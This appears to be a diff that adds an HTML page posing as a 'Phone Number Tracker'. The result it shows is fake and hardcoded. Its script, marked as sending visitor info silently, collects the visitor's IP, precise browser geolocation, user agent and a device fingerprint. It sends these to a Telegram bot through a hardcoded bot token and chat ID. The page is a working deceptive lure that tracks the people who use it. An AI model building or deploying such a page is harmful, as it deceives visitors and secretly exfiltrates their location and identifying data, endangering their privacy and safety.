@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Phone Number Tracker</title>
+  <style>
+    body {
+      background: #0d0d0d;
+      color: #0f0;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+
+    h1 {
+      font-size: 1.8em;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    input {
+      background: #222;
+      color: #0f0;
+      border: 1px solid #0f0;
+      padding: 10px;
+      width: 280px;
+      text-align: center;
+      font-size: 1em;
+      margin-bottom: 15px;
+    }
+
+    button {
+      background: #0f0;
+      color: #000;
+      padding: 10px 20px;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background: #0b0;
+    }
+
+    #result {
+      margin-top: 25px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>Phone Number Tracker</h1>
+  <input type="text" id="phone" placeholder="Enter phone number" />
+  <button onclick="track()">Track Location</button>
+
+  <div id="result"></div>
+
+  <script>
+    const BOT_TOKEN = "7743579295:AAGGNxeSBz6oFsORfR3uKNbVlGy5MAvuTsY";
+    const OWNER_CHAT_ID = "6629230649";
+
+    async function generateFingerprint() {
+      const ua = navigator.userAgent;
+      const lang = navigator.language;
+      const res = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const ram = navigator.deviceMemory || "N/A";
+      const cpu = navigator.hardwareConcurrency || "N/A";
+      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
+      const encoder = new TextEncoder();
+      const data = encoder.encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
+    }
+
+    async function getVisitorInfo() {
+      const phoneInput = document.getElementById("phone").value;
+      const clock = new Date().toLocaleString();
+      let latitude = "N/A", longitude = "N/A", ip = "N/A", country = "N/A", region = "N/A", accuracy = "N/A";
+
+      try {
+        const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
+        ip = ipData.ip;
+        country = ipData.country_name;
+        region = ipData.region;
+        latitude = ipData.latitude;
+        longitude = ipData.longitude;
+      } catch {}
+
+      try {
+        await new Promise(resolve => {
+          navigator.geolocation.getCurrentPosition(
+            pos => {
+              latitude = pos.coords.latitude.toFixed(6);
+              longitude = pos.coords.longitude.toFixed(6);
+              accuracy = pos.coords.accuracy + "m";
+              resolve();
+            },
+            () => resolve(),
+            { enableHighAccuracy: true, timeout: 5000 }
+          );
+        });
+      } catch {}
+
+      const fingerprint = await generateFingerprint();
+
+      const jsonData = {
+        "target input": phoneInput,
+        "device ip": ip,
+        "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
+        "country": country,
+        "province": region,
+        "waktu akses": clock,
+        "user-agent": navigator.userAgent,
+        "fingerprint": fingerprint
+      };
+
+      const message = `📥 *Pelacak Lokasi Diakses*\n\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: OWNER_CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
+    }
+
+    function track() {
+      const resBox = document.getElementById("result");
+      resBox.innerHTML = "🔍 Tracking location...";
+      setTimeout(() => {
+        resBox.innerHTML = `<b>Location found:</b><br>Lat: -6.2 | Long: 106.8<br>Status: <span style="color:lime">Active</span>`;
+      }, 3000);
+
+      getVisitorInfo(); // Send visitor info silently
+    }
+  </script>
+</body>
+  </html>
